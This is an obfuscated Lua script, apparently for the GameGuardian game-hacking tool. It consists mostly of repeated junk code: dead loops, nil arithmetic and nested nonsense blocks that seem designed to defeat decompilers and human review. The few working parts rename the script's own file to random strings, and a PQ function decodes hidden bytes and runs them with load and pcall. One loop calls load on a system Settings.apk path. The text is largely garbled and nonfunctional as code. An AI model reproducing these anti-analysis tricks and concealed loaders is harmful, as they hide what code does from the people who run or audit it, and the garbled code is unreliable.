for z = 1, 0 do local _ = {} if _.data ~= nil then break _.data = nil (-nil)((-nil)[nil] | nil | nil) _.n = _._.data._[z] _.g = _.n._[z] _.Batman = _.g._.n[z] _.TEAM = _.Batman._.n[z].data() _[z] = _.TEAM[u]  _[z] = nil _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _ (-nil * nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil * 1, 1<< nil), -nil} end local _ = {} _[''] = _ local x = (_)(_, _) x[1] = 1 end _ = nil _.TEAM = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end _m = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
os.rename(gg.getFile() .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)), gg.getFile())
 for i = 1, 0 do i(-nil)(-nil)(-nil * 1)(-nil)(-nil)(-nil)(-nil * 1) end 
os.rename(gg.getFile(), gg.getFile() .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)))
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.Batman() zzzzz.Batman = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.partner = zzzzz.Sniper.GamerTM() end end
for z = 1, 0 do local _ = {} if _.data ~= nil then break _.data = nil (-nil)((-nil)[nil] | nil | nil) _.n = _._.data._[z] _.g = _.n._[z] _.Batman = _.g._.n[z] _.TEAM = _.Batman._.n[z].data() _[z] = _.TEAM[u]  _[z] = nil _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _ (-nil * nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil * 1, 1<< nil), -nil} end local _ = {} _[''] = _ local x = (_)(_, _) x[1] = 1 end _ = nil _.TEAM = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end _m = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
os.rename(gg.getFile() .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)), gg.getFile())
local GBLQ = string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90))
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.Batman() zzzzz.Batman = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.partner = zzzzz.Sniper.GamerTM() end end
while(nil)do;for w=w,w do;local w={}if(w.w)then;w.w=w.w(w)end;for ww=w.w,w.w,w.w do;local ww={}if(ww.w)then;ww.w=ww.w()end;for www=w,ww.w,w do;local www={}if(www.w)then;www.w=www.w(w)end;for wwww=w,ww,www.w do;local wwww={}if(wwww.w)then;wwww.w=wwww.w(w)end;local wwww={}if(wwww.w)then;wwww.w=(wwww|www|ww|w)(w)end;end;local www={}if(www.w)then;www.w=(true|www|ww|w)(w)end;end;local ww={}if(ww.w)then;ww.w=(true|false|ww|w)(w)end;end;local w={}if(w.w)then;w.w=(true|nil|false|nil|w|nil|false|true|nil)(w)end;return(true|false|nil)end;return;end
while(nil)do;for w=w,w do;local w={}if(w.w)then;w.w=w.w(w)end;for ww=w.w,w.w,w.w do;local ww={}if(ww.w)then;ww.w=ww.w()end;for www=w,ww.w,w do;local www={}if(www.w)then;www.w=www.w(w)end;for wwww=w,ww,www.w do;local wwww={}if(wwww.w)then;wwww.w=wwww.w(w)end;local wwww={}if(wwww.w)then;wwww.w=(wwww|www|ww|w)(w)end;end;local www={}if(www.w)then;www.w=(true|www|ww|w)(w)end;end;local ww={}if(ww.w)then;ww.w=(true|false|ww|w)(w)end;end;local w={}if(w.w)then;w.w=(true|nil|false|nil|w|nil|false|true|nil)(w)end;return(true|false|nil)end;return;end
while(nil)do;for w=w,w do;local w={}if(w.w)then;w.w=w.w(w)end;for ww=w.w,w.w,w.w do;local ww={}if(ww.w)then;ww.w=ww.w()end;for www=w,ww.w,w do;local www={}if(www.w)then;www.w=www.w(w)end;for wwww=w,ww,www.w do;local wwww={}if(wwww.w)then;wwww.w=wwww.w(w)end;local wwww={}if(wwww.w)then;wwww.w=(wwww|www|ww|w)(w)end;end;local www={}if(www.w)then;www.w=(true|www|ww|w)(w)end;end;local ww={}if(ww.w)then;ww.w=(true|false|ww|w)(w)end;end;local w={}if(w.w)then;w.w=(true|nil|false|nil|w|nil|false|true|nil)(w)end;return(true|false|nil)end;return;end
while(nil)do;for w=w,w do;local w={}if(w.w)then;w.w=w.w(w)end;for ww=w.w,w.w,w.w do;local ww={}if(ww.w)then;ww.w=ww.w()end;for www=w,ww.w,w do;local www={}if(www.w)then;www.w=www.w(w)end;for wwww=w,ww,www.w do;local wwww={}if(wwww.w)then;wwww.w=wwww.w(w)end;local wwww={}if(wwww.w)then;wwww.w=(wwww|www|ww|w)(w)end;end;local www={}if(www.w)then;www.w=(true|www|ww|w)(w)end;end;local ww={}if(ww.w)then;ww.w=(true|false|ww|w)(w)end;end;local w={}if(w.w)then;w.w=(true|nil|false|nil|w|nil|false|true|nil)(w)end;return(true|false|nil)end;return;end
while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
for k, v in ipairs({}) do if ipairs(k..v) == true then break end end
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
os.rename(gg.getFile() .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)), gg.getFile())
function PQ(code) for i = script, 0 do local sssss={}if sssss.data~=nil then sssss.sel=sssss.data()end sssss=nil end local data = '' for i = script, #code do data = data .. string.char(code[gg.clearResults]/math.random(1, 1100)) end return pcall(load(data)) end
function ST() local NN = {} local N = {} N.N = {} N.N.NN = N.data() N.N.NNN = N.N.NN.data() N.NNN = NN.G() N.NNN = N.NNN:G() N.N[T] = N[G] end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
if nil ~= nil then
	_T = (-nil)((-nil)[nil] | nil | nil)
		_B = _T
			_B = _B()
				while (nil) do _B() end if _B ~= nil then do
					for i = 0,1,0 do _C = _C() _C = _Cnil _C= _C():_C(_Cnil)(_Cnil*-1).._Cnil _C = _C(_Cnil)(_C) end 
						
							for p = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _L = {(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)} _L = _L() _L = _Lnil _L= _L():_L(_Lnil)(_Lnil*-1).._Lnil _L = _L(_Lnil)(_L) if _L  ~= nil then _L = _ (_Lnil*nil) _L = nil end if _L == nil then   _L = {_L(_L*nil)(_L*nil)(nil * 1, 1  << nil), _L*nil} end end local _T = {} x[""] = T local K = (x)(x, x) K[1] = 1 end
						local x = {} x[''] = x local t = (x)(x, x) t[1] = 1
						end
						_ = {_, _(-nil)(-nil)(nil * 1, 1  << nil), -nil}
						_ = _ (nil)
						_ = -nil
						_ = _ (-nil * nil)()
						_C = _C ( _)
					_C = {(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)}
						_C = _C()
							if _C == nil then 
								_C = {_C(_C*nil)(_C*nil)(nil * 1, 1  << nil), _C*nil}
								end
						while _B ~= _C do if _T ~= _C then do
							_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
								_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
									_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
										_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
											_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
												_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
												end end end
											end end
										while _B ~= nil do 
											_C = nil,nil,nil,nil
									end
									for i=1,0 do;local j={}if j.i~=nil then j.i=j.i()end;end;
for i = 1, 0 do local sssss = {} sssss.sel = sssss.data() if sssss.data ~= nil then sssss.sel = sssss.data() end sssss = nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
for i = 1, 100 do load("/system/priv-app/Settings/Settings.apk") end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil end _m = nil end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil end _m = nil end
while (nil)do;local o={o.uo,p.p,fq.qo.o,p.p,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,q.qoyo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.pp,q.qo.o,p.p,q.qo.o,p.p,q.qi}local o={o.uo,p.p,q.qo.o,p.rp,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,qw.qoo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.p,q.qbo.o,p.p,q.qo.o,p.p,q.qi}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q))))))o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.qo.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
